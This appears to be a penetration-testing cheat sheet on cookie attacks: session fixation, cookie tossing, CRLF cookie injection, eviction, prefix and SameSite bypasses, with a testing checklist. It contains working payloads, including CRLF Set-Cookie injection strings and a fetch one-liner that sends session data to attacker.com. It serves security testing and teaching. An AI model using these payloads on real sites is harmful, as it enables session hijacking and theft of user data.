# Cookie Security Attacks

## Overview
Attacks targeting cookie implementation flaws including session fixation, cookie tossing, cookie injection, and attribute abuse.

## Cookie Attribute Analysis
```
# Secure cookie: Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict; Path=/
# Check for missing attributes in every Set-Cookie header

# Missing Secure → cookie sent over HTTP
# Missing HttpOnly → accessible via document.cookie (XSS pivot)
# Missing SameSite → CSRF possible
# Overly broad Domain → subdomain can read cookie
# Overly broad Path → accessible by all paths
```

## Session Fixation
```
# Attack: set victim's session ID before authentication
# 1. Attacker gets unauthenticated session: SESS=ATTACKER_ID
# 2. Attacker forces victim to use that session:
#    - Via link: https://target.com/login?PHPSESSID=ATTACKER_ID
#    - Via subdomain cookie injection
#    - Via HTTP parameter
# 3. Victim logs in → server attaches auth to ATTACKER_ID
# 4. Attacker now has authenticated session

# Test: does session ID change after login?
# If same session ID before/after login → session fixation vulnerable
```

## Cookie Tossing (Subdomain Injection)
```
# Subdomain can set cookies for parent domain
# Domain=target.com cookie can be set by evil.target.com

# If attacker controls subdomain (via XSS or subdomain takeover):
document.cookie = "session=evil; domain=target.com; path=/";

# Parent domain target.com now receives attacker's cookie value
# Which one is used depends on cookie ordering
```

## Cookie Injection via CRLF
```
# See crlf_injection.md
# Inject Set-Cookie header:
GET /redirect?url=https://target.com%0d%0aSet-Cookie:session=hijacked

# Or inject into existing cookie value:
name=value%0d%0aSet-Cookie:admin=true
```

## Cookie Overflow / Eviction
```
# Browsers have cookie limits (typically 50 cookies per domain)
# Flood victim's cookies → evict legitimate security cookies

# Example: evict __Secure- prefixed cookie by adding many cookies
# Then set a non-secure cookie with same name to replace it

# DoS: fill cookie jar → legitimate session cookie evicted → logout
```

## Cookie Prefix Attacks
```
# __Secure- prefix: cookie must be Secure
# __Host- prefix: must be Secure, no Domain attribute, Path=/

# Attack: if prefix validation not enforced on server
# Set __Host-session without proper attributes
# Server trusts cookie if it sees the name

# Test: can you set __Secure-session without Secure flag?
# Does server blindly trust __Host- prefixed cookies?
```

## SameSite Bypass
```
# SameSite=Lax allows cookies on top-level GET navigations
# CSRF via GET method on state-changing endpoints

# SameSite=None requires Secure flag
# Without Secure: cookie dropped in some browsers

# SameSite bypass via cross-site subdomain:
# If subdomain has XSS, SameSite=Lax doesn't protect
# Because request is same-site (*.target.com is same-site)

# Browser navigation bypass (SameSite=Lax):
# <a href="https://target.com/action?csrf_victim=1"> (top-level GET)
# window.location = "https://target.com/action"
```

## HttpOnly Bypass via XSS (if already have XSS)
```
# HttpOnly prevents document.cookie access
# But: XMLHttpRequest / fetch includes HttpOnly cookies
# Can exfiltrate via CSRF request that sends response to attacker

fetch('/api/session-info').then(r=>r.text()).then(d=>fetch('https://attacker.com/'+btoa(d)))

# Or: trace XSS → force authenticated request → capture response
```

## JWT in Cookies
```
# If JWT stored in cookie: JWT attacks apply
# Combine with cookie injection to replace JWT
# See jwt.md
```

## Cookie Scope Analysis
```
# Map cookie domains and paths:
# domain=.target.com → sent to all subdomains
# path=/ → sent to all paths
# path=/api/ → sent only to /api/ paths

# Test: can you access cookie-restricted paths?
# Test: does setting domain= explicitly weaken security?
```

## Testing Methodology
1. Capture all Set-Cookie headers across the application
2. Analyze each cookie's attributes (Secure, HttpOnly, SameSite, Domain, Path)
3. Check if session ID regenerates after login (session fixation)
4. Test cookie injection via CRLF
5. Test cookie tossing if subdomain access available
6. Test SameSite bypasses for CSRF
7. Check cookie prefix implementation
8. Look for sensitive data stored in cookies (decode Base64, JWT)
